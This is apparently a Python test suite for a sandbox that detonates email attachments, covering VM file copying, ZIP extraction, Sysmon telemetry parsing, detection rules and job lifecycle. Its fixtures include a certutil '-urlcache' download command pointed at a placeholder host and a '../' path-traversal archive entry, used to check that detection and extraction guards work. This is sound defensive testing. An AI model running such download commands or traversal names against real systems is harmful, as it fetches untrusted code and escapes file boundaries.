"""Offline sandbox regressions. No VM or attachment is executed by these tests."""
from __future__ import annotations

import base64
from io import BytesIO
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch
from zipfile import ZipFile

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sandbox import worker
from sandbox.archives import expand_candidate
from sandbox.config import PROJECT_ROOT, rules_path, sandbox_path
from sandbox.ecs_convert import sample_tree_events
from sandbox.rule_engine import load_rules, evaluate
from sandbox_agent.vbox import VBox, VBoxError
from sandbox_agent import runner
from sandbox import analysis
from db import connection, repository
from db.fake_mongo import FakeDatabase
from db.schema import ANALYSES_COLLECTION


def zip_candidate(entries):
    stream = BytesIO()
    with ZipFile(stream, "w") as archive:
        for name, data in entries:
            archive.writestr(name, data)
    return {"filename": "invoice.zip", "content_b64": base64.b64encode(stream.getvalue()).decode()}


def process_event(guid, parent, command, image=r"C:\Windows\System32\cmd.exe"):
    from xml.sax.saxutils import escape
    fields = {"ProcessGuid": guid, "ParentProcessGuid": parent, "CommandLine": command,
              "Image": image, "ParentImage": r"C:\Windows\System32\cmd.exe"}
    data = "".join(f'<Data Name="{k}">{escape(v)}</Data>' for k, v in fields.items())
    return ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            '<System><EventID>1</EventID></System><EventData>' + data + '</EventData></Event>')


class PathsAndCopies(unittest.TestCase):
    def test_paths_do_not_depend_on_server_cwd(self):
        with patch.dict(os.environ, {"SANDBOX_WORK_DIR": "backend/sandbox/work",
                                     "SANDBOX_RULES_DIR": "backend/sandbox/rules"}):
            with tempfile.TemporaryDirectory() as temporary:
                previous = Path.cwd()
                try:
                    os.chdir(temporary)
                    self.assertEqual(sandbox_path("SANDBOX_WORK_DIR", "work"), PROJECT_ROOT / "backend/sandbox/work")
                    self.assertEqual(rules_path(), PROJECT_ROOT / "backend/sandbox/rules")
                finally:
                    os.chdir(previous)

    def test_missing_rules_are_an_error(self):
        with patch.dict(os.environ, {"SANDBOX_RULES_DIR": "does-not-exist"}):
            with self.assertRaisesRegex(ValueError, "rules directory"):
                rules_path()

    def test_copy_uses_absolute_paths_with_spaces(self):
        vbox = VBox.__new__(VBox)
        vbox._gc = MagicMock()
        with tempfile.TemporaryDirectory(prefix="etap space ") as temporary:
            sample = Path(temporary) / "sample.js"
            sample.write_text("// harmless data")
            vbox.copy_to(str(sample), r"C:\sandbox\in")
            self.assertEqual(vbox._gc.call_args.args[-1], str(sample.resolve()))
            vbox.copy_from(r"C:\sandbox\out\sysmon.xml", str(Path(temporary) / "sysmon.xml"))
            self.assertEqual(vbox._gc.call_args.args[0], "copyfrom")
            self.assertTrue(Path(vbox._gc.call_args.args[-1]).is_absolute())

    def test_copy_missing_file_fails_before_guestcontrol(self):
        vbox = VBox.__new__(VBox)
        vbox._gc = MagicMock()
        with self.assertRaises(FileNotFoundError):
            vbox.copy_to("definitely-missing-sample.js", r"C:\sandbox\in")
        vbox._gc.assert_not_called()

    def test_guest_arguments_have_no_duplicate_argv0_or_literal_quotes(self):
        vbox = VBox.__new__(VBox)
        vbox._gc = MagicMock()
        vbox.run_exe(r"C:\Windows\System32\cscript.exe", "//Nologo", r"C:\sandbox\in\sample.js")
        arguments = vbox._gc.call_args.args
        self.assertEqual(arguments[arguments.index("--") + 1:], ("//Nologo", r"C:\sandbox\in\sample.js"))
        vbox.run_cmd_ps('Write-Output "a quote"')
        arguments = vbox._gc.call_args.args
        encoded = arguments[arguments.index("-EncodedCommand") + 1]
        self.assertEqual(base64.b64decode(encoded).decode("utf-16le"), 'Write-Output "a quote"')


class ArchivesAndTelemetry(unittest.TestCase):
    def test_zip_script_is_selected_with_provenance(self):
        candidates = expand_candidate(zip_candidate([("invoice.js", "// harmless fixture"), ("readme.txt", "hello")]))
        self.assertEqual(len(candidates), 1)
        child = candidates[0]
        self.assertEqual(child["filename"], "invoice.zip / invoice.js")
        self.assertEqual(base64.b64decode(child["content_b64"]), b"// harmless fixture")
        self.assertEqual(child["archive"], "invoice.zip")

    def test_traversal_and_nested_archives_are_reported(self):
        candidates = expand_candidate(zip_candidate([("../escape.js", "// x"), ("nested.zip", "not executed")]))
        self.assertEqual(len(candidates), 2)
        self.assertTrue(all(c.get("inspection_error") for c in candidates))

    def test_expansion_limit_and_corrupt_archives_are_reported(self):
        with patch("sandbox.archives.MAX_EXPANDED_BYTES", 4):
            self.assertIn("limit", expand_candidate(zip_candidate([("a.js", "12345")]))[0]["inspection_error"])
        self.assertIn("Cannot inspect ZIP", expand_candidate({"filename": "x.zip", "content_b64": "eA=="})[0]["inspection_error"])

    def test_no_launcher_and_member_limit_are_explicit(self):
        self.assertIn("No eligible", expand_candidate(zip_candidate([("a.txt", "hello")]))[0]["inspection_error"])
        candidates = expand_candidate(zip_candidate([(f"{i}.js", "// fixture") for i in range(4)]))
        self.assertEqual(sum(bool(c.get("content_b64")) for c in candidates), 3)
        self.assertIn("limit", candidates[-1]["inspection_error"])

    def test_guid_tree_excludes_unrelated_same_executable(self):
        xml = ("<Events>" + process_event("child", "root", "child command")
               + process_event("root", "outside", "cmd /c sample_marker.js")
               + process_event("unrelated", "outside", "unrelated command")
               + process_event("root2", "outside", "wscript sample_marker.js") + "</Events>")
        guids = {e["process"]["entity_id"] for e in sample_tree_events(xml, "sample_marker")}
        self.assertEqual(guids, {"root", "child", "root2"})

    def test_real_rules_detect_script_host_and_certutil(self):
        rules, skipped = load_rules(str(PROJECT_ROOT / "backend/sandbox/rules"))
        self.assertGreater(len(rules), 0)
        self.assertGreater(len(skipped), 0)
        xml = ("<Events>" + process_event("root", "outside", r"wscript C:\sandbox\in\sample_marker.js", r"C:\Windows\System32\wscript.exe")
               + process_event("child", "root", "certutil.exe -urlcache -split -f http://example.invalid/demo.txt C:\\demo.txt", r"C:\Windows\System32\certutil.exe") + "</Events>")
        hits = evaluate(rules, sample_tree_events(xml, "sample_marker"))
        self.assertIn("etap-001", {h["rule_id"] for h in hits})


class WorkerLifecycle(unittest.TestCase):
    def setUp(self):
        self.database = FakeDatabase()
        connection.set_db(self.database)
        self.email_id = str(self.database[ANALYSES_COLLECTION].insert_one({"risk_score": 10}).inserted_id)
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.addCleanup(connection.reset_db)

    def job(self):
        return {"job_id": "job_offline", "email_id": self.email_id, "status": "queued", "mode": "virtualbox",
                "error": None, "started_at": None, "finished_at": None, "items": [],
                "candidates": [{"filename": "a.js", "content_b64": "Ly8gZml4dHVyZQ=="}]}

    def run_job(self, job, vbox, xml="<Events></Events>"):
        with patch.object(runner, "VBox", return_value=vbox), patch.object(worker, "_get_work_dir", return_value=Path(self.temp.name)), \
             patch.object(runner, "_collect_sysmon", return_value=xml), patch.object(runner.time, "sleep"), \
             patch.object(runner, "_security_checkpoint", return_value=(0, None)), patch.object(runner, "_collect_security_events", return_value=[]):
            worker._process_job(job)
        return repository.get_analysis(self.database, self.email_id)["sandbox_analysis"]

    def test_copy_failure_is_error_and_baseline_is_restored(self):
        vbox = MagicMock(dwell=1)
        vbox.copy_to.side_effect = VBoxError("copy failed")
        result = self.run_job(self.job(), vbox)
        self.assertEqual(result["status"], "error")
        self.assertEqual(result["items"][0]["verdict"], "error")
        self.assertEqual(result["verdict"], "inspection_incomplete")
        self.assertIsNotNone(result["finished_at"])
        self.assertEqual(vbox.restore.call_count, 2)
        self.assertFalse(list(Path(self.temp.name).rglob("sample_*")))

    def test_missing_app_stays_incomplete(self):
        job = self.job()
        job["candidates"][0]["filename"] = "a.docx"
        result = self.run_job(job, MagicMock(dwell=1))
        self.assertEqual(result["items"][0]["verdict"], "inspection_incomplete")
        self.assertEqual(result["status"], "error")

    def test_missing_sample_telemetry_is_incomplete(self):
        vbox = MagicMock(dwell=1)
        vbox.run_exe.return_value = subprocess.CompletedProcess([], 0, "", "")
        result = self.run_job(self.job(), vbox)
        self.assertEqual(result["status"], "error")
        self.assertIn("could not be confirmed", result["items"][0]["note"])

    def test_telemetry_failure_preserves_item_and_restores(self):
        vbox = MagicMock(dwell=1)
        vbox.run_exe.return_value = subprocess.CompletedProcess([], 0, "", "")
        with patch.object(runner, "_collect_sysmon", side_effect=VBoxError("export failed")), \
             patch.object(runner, "VBox", return_value=vbox), patch.object(worker, "_get_work_dir", return_value=Path(self.temp.name)), \
             patch.object(runner.time, "sleep"):
            job = self.job()
            worker._process_job(job)
        self.assertEqual(job["status"], "error")
        self.assertEqual(len(job["items"]), 1)
        self.assertEqual(vbox.restore.call_count, 2)

    def test_status_snapshots_hide_payloads_and_include_every_phase(self):
        job = self.job()
        with patch.dict(worker._jobs, {job["job_id"]: job}, clear=True):
            for status in ("queued", "starting", "interacting", "collecting", "evaluating", "restoring"):
                job["status"] = status
                public = worker.current_analysis(self.email_id, {"status": "queued"})
                self.assertEqual(public["status"], status)
                self.assertIsInstance(public["candidates"], int)
                self.assertNotIn("content_b64", str(public))
            public["items"].append({"changed": True})
            self.assertEqual(job["items"], [])

    def test_same_extension_samples_have_different_names(self):
        vbox = MagicMock(dwell=1)
        vbox.run_exe.return_value = subprocess.CompletedProcess([], 0, "", "")
        with patch.object(runner.time, "sleep"):
            candidate = self.job()["candidates"][0]
            first = runner.detonate_single(vbox, "job_123456", candidate, Path(self.temp.name))
            second = runner.detonate_single(vbox, "job_123456", candidate, Path(self.temp.name))
        self.assertNotEqual(first["sample_marker"], second["sample_marker"])

    def test_defender_command_block_is_attributed_only_with_runtime_denial(self):
        item = {"sample_marker": "sample_unique", "process_tree": [],
                "launch_error": "JavaScript runtime error: Permission denied"}
        events = [{"event_id": 1116, "message": "Path: CmdLine:_C:\\Windows\\System32\\certutil.exe -urlcache"}]
        self.assertEqual(analysis.security_blocks(item, events, single_sample=True), events)
        self.assertEqual(analysis.security_blocks(item, events, single_sample=False), [])
        item["launch_error"] = None
        self.assertEqual(analysis.security_blocks(item, events, single_sample=True), [])


if __name__ == "__main__":
    unittest.main()


class PdfLauncherTests(unittest.TestCase):
    """PDFs open in the guest; the viewer is configurable and can be turned off."""

    def test_default_handler_opens_pdf(self):
        from sandbox.policy import launcher_for
        with patch.dict(os.environ, {"SANDBOX_PDF_VIEWER": ""}):
            exe, args = launcher_for("invoice.PDF")
        self.assertTrue(exe.lower().endswith("cmd.exe"))
        self.assertIn('start "" "{file}"', args)

    def test_configured_viewer_and_off_switch(self):
        from sandbox.policy import launcher_for
        viewer = r"C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe"
        with patch.dict(os.environ, {"SANDBOX_PDF_VIEWER": viewer}):
            self.assertEqual(launcher_for("a.pdf"), (viewer, '"{file}"'))
        with patch.dict(os.environ, {"SANDBOX_PDF_VIEWER": "none"}):
            self.assertEqual(launcher_for("a.pdf"), (None, None))
